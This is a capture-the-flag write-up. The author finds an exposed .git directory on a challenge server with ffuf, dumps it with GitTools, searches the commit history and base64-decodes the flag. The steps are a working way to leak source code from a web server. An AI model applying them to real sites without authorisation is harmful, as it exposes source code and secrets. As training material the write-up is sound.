## üõ†Ô∏è Solution

The task description tipped me off that this would be a Git-related task.

The first thing I did was to enumerate the site's directories using `ffuf`.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://23.179.17.40:58002/FUZZ
```
Indeed, there was a .git directory available

       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/

```

To further analyze this repository, I used the GitTools (https://github.com/internetwache/GitTools). I dumped everything using `gitdumper.sh`

```bash
./gitdumper.sh http://23.179.17.40:58002/.git/ git
```

I checked all the commits that took place and their contents to find the flag there. In order to do that, I used the following command, which only cut out the ID of the given commit and passed it to `git show` command

```bash
sudo git log | grep commit | cut -d " " -f2 | xargs sudo git show
```
In one of the commits there was this message:

```plaintext
This admin panel is under construction. No actual functionality is available yet. But here, have this: Q0lUezVkODFmNzc0M2Y0YmMyYWJ9
```
After decoding this (`Q0lUezVkODFmNzc0M2Y0YmMyYWJ9`) with base64, I obtained the flag.
